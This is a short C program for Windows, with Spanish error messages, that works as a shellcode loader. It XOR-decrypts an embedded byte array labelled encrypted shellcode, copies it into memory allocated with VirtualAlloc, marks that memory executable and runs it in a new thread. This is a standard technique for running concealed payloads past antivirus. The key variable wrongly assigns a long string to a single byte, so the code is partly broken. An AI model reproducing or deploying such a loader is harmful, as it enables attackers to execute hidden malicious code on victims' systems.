#include <windows.h>
#include <stdio.h>

unsigned char encrypted_shellcode[] = "\xd8\x6c\xa7\xc0\xd4\xcc\xe4\x24\x24\x24\x65\x75\x65\x74\x76\x75\x72\x6c\x15\xf6\x41\x6c\xaf\x76\x44\x6c\xaf\x76\x3c\x6c\xaf\x76\x04\x6c\xaf\x56\x74\x6c\x2b\x93\x6e\x6e\x69\x15\xed\x6c\x15\xe4\x88\x18\x45\x58\x26\x08\x04\x65\xe5\xed\x29\x65\x25\xe5\xc6\xc9\x76\x65\x75\x6c\xaf\x76\x04\xaf\x66\x18\x6c\x25\xf4\xaf\xa4\xac\x24\x24\x24\x6c\xa1\xe4\x50\x43\x6c\x25\xf4\x74\xaf\x6c\x3c\x60\xaf\x64\x04\x6d\x25\xf4\xc7\x72\x6c\xdb\xed\x65\xaf\x10\xac\x6c\x25\xf2\x69\x15\xed\x6c\x15\xe4\x88\x65\xe5\xed\x29\x65\x25\xe5\x1c\xc4\x51\xd5\x68\x27\x68\x00\x2c\x61\x1d\xf5\x51\xfc\x7c\x60\xaf\x64\x00\x6d\x25\xf4\x42\x65\xaf\x28\x6c\x60\xaf\x64\x38\x6d\x25\xf4\x65\xaf\x20\xac\x6c\x25\xf4\x65\x7c\x65\x7c\x7a\x7d\x7e\x65\x7c\x65\x7d\x65\x7e\x6c\xa7\xc8\x04\x65\x76\xdb\xc4\x7c\x65\x7d\x7e\x6c\xaf\x36\xcd\x73\xdb\xdb\xdb\x79\x6d\x9a\x53\x57\x16\x7b\x17\x16\x24\x24\x65\x72\x6d\xad\xc2\x6c\xa5\xc8\x84\x25\x24\x24\x6d\xad\xc1\x6d\x98\x26\x24\x25\x9f\xe4\x8c\xe3\xa4\x65\x70\x6d\xad\xc0\x68\xad\xd5\x65\x9e\x68\x53\x02\x23\xdb\xf1\x68\xad\xce\x4c\x25\x25\x24\x24\x7d\x65\x9e\x0d\xa4\x4f\x24\xdb\xf1\x74\x74\x69\x15\xed\x69\x15\xe4\x6c\xdb\xe4\x6c\xad\xe6\x6c\xdb\xe4\x6c\xad\xe5\x65\x9e\xce\x2b\xfb\xc4\xdb\xf1\x6c\xad\xe3\x4e\x34\x65\x7c\x68\xad\xc6\x6c\xad\xdd\x65\x9e\xbd\x81\x50\x45\xdb\xf1\x6c\xa5\xe0\x64\x26\x24\x24\x6d\x9c\x47\x49\x40\x24\x24\x24\x24\x24\x65\x74\x65\x74\x6c\xad\xc6\x73\x73\x73\x69\x15\xe4\x4e\x29\x7d\x65\x74\xc6\xd8\x42\xe3\x60\x00\x70\x25\x25\x6c\xa9\x60\x00\x3c\xe2\x24\x4c\x6c\xad\xc2\x72\x74\x65\x74\x65\x74\x65\x74\x6d\xdb\xe4\x65\x74\x6d\xdb\xec\x69\xad\xe5\x68\xad\xe5\x65\x9e\x5d\xe8\x1b\xa2\xdb\xf1\x6c\x15\xf6\x6c\xdb\xee\xaf\x2a\x65\x9e\x2c\xa3\x39\x44\xdb\xf1\x9f\xd4\x91\x86\x72\x65\x9e\x82\xb1\x99\xb9\xdb\xf1\x6c\xa7\xe0\x0c\x18\x22\x58\x2e\xa4\xdf\xc4\x51\x21\x9f\x63\x37\x56\x4b\x4e\x24\x7d\x65\xad\xfe\xdb\xf1";
unsigned char key = 'GLEWKJGW3KLJ3GJLK3GWLKGJGLWK3GJ$%·$&·$·$hs$eh$';

void xor_decrypt(unsigned char *data, size_t data_len, unsigned char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key;
    }
}

int main() {
    void *exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldProtect = 0;

    size_t shellcode_len = sizeof(encrypted_shellcode);
    xor_decrypt(encrypted_shellcode, shellcode_len, key);
    exec_mem = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL) {
        printf("Error al asignar memoria.\n");
        return 1;
    }
    RtlMoveMemory(exec_mem, encrypted_shellcode, shellcode_len);
    rv = VirtualProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);
    if (rv == 0) {
        printf("Error al cambiar permisos de memoria.\n");
        return 1;
    }
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    if (th == NULL) {
        printf("Error al crear el hilo.\n");
        return 1;
    }

    WaitForSingleObject(th, -1);

    return 0;
}
